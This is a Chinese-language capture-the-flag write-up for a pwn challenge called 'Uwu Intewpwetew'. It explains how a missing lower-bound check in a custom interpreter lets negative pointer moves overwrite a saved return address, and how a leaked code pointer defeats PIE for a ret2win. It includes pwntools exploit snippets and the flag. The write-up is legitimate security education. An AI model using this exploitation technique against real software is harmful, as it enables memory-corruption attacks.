# Uwu Intewpwetew

## 题目简述

自制解释器在栈上维护数据带和指针。指令 owo 将指针向低地址移动，但边界判断只拒绝 pointer > DATA_LEN，没有检查负数。把指针向前移动十格后，就能读写数据带之前的栈帧，其中包含返回地址；PIE 可通过泄漏地址与已知函数内偏移修正。

## 解题过程

构造十次 owo 越过数据带起点，再用两次 @w@ 打印相邻单元，定位保存的返回地址，最后用 >w< 请求写入：

~~~python
payload = b"owo " * 10 + b"@w@ @w@ " + b">w<"
io.sendlineafter(b"Send me your cowode:\n", payload)
~~~

第二个泄漏值位于 vuln 返回路径中的固定位置。虽然 PIE 随机化了基址，但 win 与该位置之间的相对距离固定：

~~~python
leak = int(io.recvline().strip())
offset = exe.sym["win"] - (exe.sym["vuln"] + 0x35d)
io.sendlineafter(b"Input: ", str(leak + offset).encode())
~~~

解释器把计算后的 win 地址写回保存的返回地址，vuln 返回时跳入 win：

~~~text
maple{nyo_wespect_fow_boundawies}
~~~

## 方法总结

数组边界必须同时验证下界和上界；只检查 pointer > length 会让负索引变成任意栈访问。PIE 只能随机化绝对地址，不能改变同一模块内符号间相对偏移，因此一次代码指针泄漏通常足以完成 ret2win。
